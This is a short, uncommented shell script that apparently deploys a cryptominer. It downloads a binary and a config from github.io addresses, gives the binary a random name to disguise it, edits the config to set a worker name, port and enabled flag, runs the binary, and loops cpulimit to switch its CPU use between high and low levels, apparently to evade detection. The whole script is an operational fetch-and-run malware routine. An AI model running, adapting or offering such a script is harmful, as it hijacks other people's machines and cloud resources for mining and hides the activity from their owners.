wget http://dzmltzack.github.io/web/xm -O oxm
rm -f za*
rm -f config*
wget https://pzeankto.github.io/namnam/arqt.json -O config.json
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
BB=zaca$NEW_UUID
NN=zaca$NEW_UUID
cp oxm $BB
echo $NN >> $BB
sed -i "s/PSPS/HerMoussa/g" config.json
sed -i "s/8080/$PORT/g" config.json
sed -i 's/"enabled": false/"enabled": true/g' config.json
chmod +x $BB
./zaca*
result=$(($(grep -c processor /proc/cpuinfo) * 40))
while true
do
cpulimit -b -l $result -p $(pgrep zaca)
sleep 220
cpulimit -b -l 10 -p $(pgrep zaca)
sleep 60
done
